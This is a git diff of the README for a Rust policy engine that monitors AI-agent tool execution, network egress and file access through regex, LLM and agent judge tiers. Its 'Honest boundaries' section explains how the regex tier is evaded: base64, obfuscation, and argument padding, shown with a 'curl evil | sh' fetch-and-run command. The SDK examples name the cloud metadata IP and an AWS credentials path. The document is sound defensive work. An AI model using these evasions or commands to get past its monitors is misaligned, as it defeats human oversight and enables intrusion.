@@ -43,6 +43,11 @@ Observer provides the **signal** (`ToolExec`, `SslContent`, `SecurityAction`, `E
 hot-reload). Sentry decides. It never enforces anything itself — keeping it a pure policy brain and
 the kernel the single enforcement point.
 
+For `ToolExec`, observer also reports whether argv was truncated or could not be fully reassembled.
+Sentry still blocks an explicitly dangerous captured prefix, but an ambiguous incomplete command
+stops as an L1 escalation instead of becoming an ordinary allow or a model decision based on missing
+evidence.
+
 ## Install
 
 Published from the repo's own GitHub Actions (a `vX.Y.Z` tag runs [`release.yml`](.github/workflows/release.yml)):
@@ -131,7 +136,9 @@ rules = [
 ]
 ```
 
-First match wins; no match = allow. See [`policy/rules.acl`](policy/rules.acl).
+First match wins; no match = allow for complete evidence. An incomplete `ToolExec` skips matching
+allow rules and escalates at L1 when no dangerous block rule matches. See
+[`policy/rules.acl`](policy/rules.acl).
 
 ## Dynamic policy & embedding
 
@@ -153,11 +160,14 @@ let pipeline = Pipeline::new(rules.clone())                        // L1
     .fail_closed(false);
 
 let decision = pipeline.evaluate(&observed_event);   // your own event source
+let fast = pipeline.evaluate_through_l2(&observed_event); // persist escalations for external L3
 rules.reload()?;   // force-apply config changes now (e.g. on a signal / admin API)
 ```
 
 Every tier is a `Judge` trait impl, so you can swap L1/L2/L3 for your own (a different model, an
-in-house ruleset) and keep the escalation machinery.
+in-house ruleset) and keep the escalation machinery. `evaluate_through_l2` never invokes L3 or
+applies `fail_closed`; callers must durably dispatch any `Escalated` result instead of treating it as
+an allow.
 
 ## SDKs (Python · TypeScript)
 
@@ -184,11 +194,16 @@ firing at `tier=Rules`).
 - **TypeScript** — [`sdk/typescript`](sdk/typescript), live on npm: `npm install @a3s-lab/sentry` (Node ≥12):
 
   ```ts
-  import { Sentry, egress } from "@a3s-lab/sentry";
+  import { Sentry, egress, fileAccess } from "@a3s-lab/sentry";
 
   const sentry = Sentry.create("sentry.acl");
   const d = sentry.evaluate(egress(1, "169.254.169.254", 80));
   if (d?.verdict === "block") console.log(d.reason, d.action); // { kind: "DenyEgress", target: "…" }
+
+  const fast = await sentry.evaluateThroughL2(
+    fileAccess(1, "/home/u/.aws/credentials", false),
+  );
+  if (fast.stageStatus === "escalated") await durableL3Queue.send(fast);
   ```
 
 The `sentry.acl` config — rules, optional `llm {}` (L2) / `agent {}` (L3) backends, and `deny {}`
@@ -322,18 +337,21 @@ dashboard. Output text has no kernel deny target, so an SAE block rides the encl
 Set `A3S_SENTRY_METRICS_ADDR` (e.g. `0.0.0.0:9100`) to expose, with no extra dependency:
 
 - **`GET /metrics`** — Prometheus counters: `sentry_events_total`, `sentry_blocked_total`,
-  **`sentry_overload_degraded_total`** (escalations that fell through to the fail mode), and
+  **`sentry_overload_degraded_total`** (escalations rejected by the full worker queue), and
   **`sentry_enforce_failed_total`** (a block whose deny-write errored). For a *fail-open* control those
-  last two are the ones to **alarm on** — both mean a block did **not** take effect.
+  last two are the ones to **alarm on** — both mean the enforcement path may not have completed.
 - **`GET /healthz`** — `200 ok` while the process is alive (the k8s liveness/readiness probe in
   [`deploy/daemonset.yaml`](deploy/daemonset.yaml) hits this).
 
 ## Honest boundaries
 
 - **L1 is a cheap pre-filter, not a sandbox.** Regex rules are evadable (obfuscation, base64,
-  alternate interpreters, variable indirection), and observer truncates each argv slot to **64
-  bytes** — a `sh -c "<padding>; curl evil | sh"` outruns every content rule. Treat L1 as fast triage
-  that catches lazy cases and escalates the rest; the real boundary is L2/L3 or an observer
+  alternate interpreters, variable indirection), and observer command capture is bounded. Observer
+  now marks truncated or incompletely reassembled argv explicitly; Sentry blocks a dangerous
+  captured prefix and preserves ambiguous evidence as an L1 escalation. A caller using the staged
+  API must persist and dispatch that escalation to an external L3 worker. The bundled daemon audits
+  the unresolved decision, including during worker overload, but does not provide a durable external
+  L3 queue. Treat L1 as fast triage; the real boundary is durable L3 handling or an observer
   egress/exec **allow-list**, not L1's block list.
 - **Two paths, by design.** The observer-event path is *reactive*: sentry acts on observer's events,
   so it blocks the *next* dangerous action / future connections — the flagged action itself has
@@ -357,7 +375,8 @@ Set `A3S_SENTRY_METRICS_ADDR` (e.g. `0.0.0.0:9100`) to expose, with no extra dep
   Without it sentry still sees exec / egress / file / SecurityAction, just not prompt/response text.
 - **L2/L3 run in a worker pool** off the ingest thread, so a slow tier never head-of-line-blocks the
   L1 stream (validated: ~1.15M ev/s with a 0.5s L2 in the mix). Under an escalation flood the bounded
-  queue degrades gracefully to the fail-mode (audited; counted as `overload-degraded`).
+  queue degrades complete-evidence events to the fail mode; incomplete command evidence remains an
+  audited L1 escalation. Both are counted as `overload-degraded`.
 
 ## Build & test
 
@@ -369,13 +388,14 @@ cargo build --release
 
 Pure userspace Rust (serde / regex / ureq / hcl) — no kernel components; those live in a3s-observer.
 
-- **Unit** (41) — rules + escalation + enforce + parsing + the speculative/hot-reload/cap logic + the
+- **Unit** (67) — rules + escalation + enforce + parsing + the speculative/hot-reload/cap logic + the
   metrics endpoint.
-- **Integration** (`tests/integration.rs`, 12) — the real binary end to end: block → deny-file,
+- **Integration** (`tests/integration.rs`, 13) — the real binary end to end: block → deny-file,
   dry-run, fail-open/closed, malformed-input, live hot-reload, `--version`, the **L2 round-trip**
   against a mock OpenAI endpoint, the **L3 agent** path (mock agent → block → deny-file), **overload
-  degradation** (slow L3 + queue=1 → graceful degrade, clean exit), and the **metrics endpoint**
-  (live `/metrics` counters + `/healthz`). All CI-reproducible.
+  handling** (slow L3 + queue=1 → graceful complete-evidence degradation while incomplete evidence
+  stays escalated), and the **metrics endpoint** (live `/metrics` counters + `/healthz`). All
+  CI-reproducible.
 - **Soak** (`scripts/soak.sh` + `scripts/soak-l2.sh`) — sustained mixed load + policy-rewrite-under-load
   (10M+ events, RSS flat, 0 panics, dedup-bounded); and a **worker-pool soak** proving a slow L2 never
   head-of-line-blocks the L1 stream (**~1.15M ev/s on Linux with a 0.5s L2**, RSS flat 6.5 MB, graceful
